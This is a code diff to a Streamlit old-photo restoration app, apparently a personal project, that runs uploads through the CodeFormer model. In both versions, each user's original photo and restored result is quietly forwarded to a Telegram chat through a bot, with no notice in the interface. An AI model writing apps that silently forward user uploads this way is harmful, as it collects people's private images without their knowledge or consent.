@@ -7,7 +7,7 @@ from PIL import Image
 # 1. إعدادات الصفحة
 st.set_page_config(page_title="Aziz Ultra Restore", layout="centered")
 st.title("🌟 Aziz Ultra Restoration")
-st.markdown("تحسين شامل: الوجه، اليدين، وتفاصيل الملابس")
+st.markdown("تحسين شامل لكامل الصورة: الوجه، اليدين، والملابس")
 
 # 2. جلب البيانات من الـ Secrets
 try:
@@ -17,52 +17,48 @@ try:
 except:
     bot = None
 
-uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم الشامل...", type=["jpg", "jpeg", "png"])
+# 3. واجهة رفع الصور
+uploaded_file = st.file_uploader("ارفع الصورة القديمة هنا...", type=["jpg", "jpeg", "png"])
 
 if uploaded_file:
     image = Image.open(uploaded_file)
     st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
     
-    if st.button("🚀 ابدأ الترميم الكامل"):
-        with st.spinner("جاري توضيح كافة التفاصيل (اليدين، الملابس، والوجه)..."):
+    if st.button("🚀 بدء الترميم الشامل"):
+        with st.spinner("جاري تحليل وترميم كافة تفاصيل الصورة (قد يستغرق وقتاً)..."):
             try:
+                # حفظ الصورة مؤقتاً
                 temp_input = "temp_input.png"
                 image.save(temp_input)
 
                 # إرسال الأصل للتليجرام
                 if bot and CHAT_ID:
-                    try:
-                        with open(temp_input, "rb") as f_in:
-                            bot.send_photo(CHAT_ID, f_in, caption="📸 الأصل")
-                    except:
-                        pass
+                    with open(temp_input, "rb") as f_in:
+                        bot.send_photo(CHAT_ID, f_in, caption="📸 الأصل")
 
                 # --- استخدام محرك تنقية شامل (Upscaler) ---
-                # هذا المحرك يوضح اليدين والخلفية بذكاء عالي
+                # هذا المحرك أقوى في توضيح الدين والملابس والخلفية
                 client = Client("sczhou/CodeFormer")
                 result = client.predict(
                     image=handle_file(temp_input),
-                    background_enhance=True, # تفعيل تحسين الخلفية والدين
+                    background_enhance=True, # << فعلت لك هذا الخيار لتوضيح الدين والملابس
                     face_upsample=True,
                     upscale=2,
-                    codeformer_fidelity=0.5 # ميزان ذهبي: توضيح عالي مع ملامح طبيعية
+                    codeformer_fidelity=0.5 # << ميزان ذهبي: عيون طبيعية مع توضيح عالي
                 )
                 
                 restored_path = result[0] if isinstance(result, (list, tuple)) else result
                 
-                # عرض النتيجة
-                st.image(restored_path, caption="✅ تم الترميم الكامل بنجاح", use_container_width=True)
+                # عرض النتيجة وزر الحفظ
+                st.image(restored_path, caption="✅ تم الترميم الشامل بنجاح", use_container_width=True)
                 
                 with open(restored_path, "rb") as file:
-                    st.download_button("📥 حفظ الصورة في جوالك", file, "Aziz_Ultra_Restore.png", "image/png")
+                    st.download_button("📥 حفظ الصورة في جوالك", file, "Aziz_Full_Restore.png", "image/png")
 
                 # إرسال النتيجة للتليجرام
                 if bot and CHAT_ID:
-                    try:
-                        with open(restored_path, "rb") as f_out:
-                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الشاملة (عيون طبيعية وتفاصيل واضحة)")
-                    except:
-                        pass 
+                    with open(restored_path, "rb") as f_out:
+                        bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الشاملة")
                 
                 if os.path.exists(temp_input): os.remove(temp_input)
                 
